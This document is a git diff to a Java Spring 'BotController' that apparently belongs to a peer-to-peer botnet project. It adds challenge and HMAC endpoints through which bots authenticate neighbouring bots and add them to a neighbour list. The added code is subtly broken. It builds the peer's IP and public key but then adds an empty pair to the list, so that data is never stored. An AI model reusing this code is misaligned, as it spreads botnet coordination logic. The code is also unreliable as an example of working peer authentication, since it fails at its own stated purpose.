@@ -1,11 +1,14 @@
 package cs.sii.controller;
 
 import java.security.InvalidKeyException;
+import java.security.PublicKey;
 import java.security.SecureRandom;
 import java.security.SignatureException;
+import java.util.ArrayList;
 import java.util.Random;
 
 import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Component;
@@ -19,6 +22,7 @@ import cs.sii.bot.action.Auth;
 import cs.sii.bot.action.Behavior;
 import cs.sii.config.onLoad.Config;
 import cs.sii.domain.IP;
+import cs.sii.domain.Pairs;
 import cs.sii.service.connection.NetworkService;
 import cs.sii.service.crypto.CryptoPKI;
 
@@ -74,6 +78,29 @@ public class BotController {
 			return false;
 		}
 	}
+	
+	@RequestMapping("/myneighbours/welcome")
+	public Pairs<Long, Integer> myNeighbours(@RequestBody String idBot,HttpServletRequest req) {
+		System.out.println("Richiesta challenge dal mio vicino ricevuta da"+req.getRemoteAddr());
+		Pairs<Long, Integer> response = new Pairs<>();
+		response = bhv.authReqBot(idBot);
+		return response;
+		}
+	
+	
+	@RequestMapping("/myneighbours/hmac")
+	public void myNeighboursHmac(@RequestBody ArrayList<Object> objects,HttpServletRequest req) {
+		System.out.println("Richiesta con hmac de ricevuta da"+req.getRemoteAddr());
+		Boolean response = false;
+		response =bhv.checkHmacBot(objects);
+		if(response){
+			Pairs<IP,PublicKey> bot=new Pairs<IP, PublicKey>();
+			IP ipbot=new IP(objects.get(0).toString());
+			PublicKey pubKey=pki.rebuildPuK(objects.get(2).toString());
+			nServ.getNeighbours().add(bot);
+		}
+	}
+	
 
 	@RequestMapping("/ping")
 	public Boolean ping() {
